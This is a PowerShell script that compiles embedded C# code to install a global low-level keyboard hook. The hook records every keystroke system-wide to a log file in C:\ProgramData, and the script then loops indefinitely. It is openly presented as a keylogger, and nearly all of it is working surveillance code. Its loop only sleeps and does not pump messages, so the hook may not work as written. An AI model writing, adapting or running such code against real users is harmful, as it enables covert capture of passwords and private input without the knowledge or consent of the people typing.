# Set log file path
$logFile = "C:\ProgramData\keylogger.log"
$scriptName = "Keylogger.ps1"

# Function to log keystrokes
function Log-Message {
    param (
        [string]$message,
        [string]$level = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp [$level] [$scriptName] $message"
    Add-Content -Path $logFile -Value $logEntry
}

# Load user32.dll for key interception
$signature = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class KeyLogger {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static IntPtr hookID = IntPtr.Zero;

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private static HookProc proc = HookCallback;

    public static void Start() {
        hookID = SetHook(proc);
    }

    public static void Stop() {
        UnhookWindowsHookEx(hookID);
    }

    private static IntPtr SetHook(HookProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((ConsoleKey)vkCode);
            System.IO.File.AppendAllText("C:\\ProgramData\\keylogger.log", ((ConsoleKey)vkCode).ToString() + " ");
        }
        return CallNextHookEx(hookID, nCode, wParam, lParam);
    }
}
"@

# Compile the C# code and load it into PowerShell
Add-Type -TypeDefinition $signature -Language CSharp

# Start logging
Log-Message "Starting global keylogger."

# Start the keylogger
[KeyLogger]::Start()

# Keep script running
while ($true) { Start-Sleep -Seconds 1 }
